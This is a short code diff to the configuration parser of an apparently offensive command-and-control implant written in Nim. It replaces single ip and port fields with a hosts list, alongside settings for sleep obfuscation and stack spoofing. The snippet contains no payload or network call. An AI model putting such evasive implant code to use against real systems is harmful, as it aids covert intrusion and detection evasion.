@@ -27,8 +27,7 @@ proc deserializeConfiguration(config: string): AgentCtx =
     var ctx = AgentCtx(
         agentId: generateUUID(),
         listenerId: Uuid.toString(unpacker.getUint32()),
-        ip: unpacker.getDataWithLengthPrefix(),
-        port: int(unpacker.getUint32()),
+        hosts: unpacker.getDataWithLengthPrefix(),
         sleep: int(unpacker.getUint32()),
         sleepTechnique: cast[SleepObfuscationTechnique](unpacker.getUint8()),
         spoofStack: cast[bool](unpacker.getUint8()),
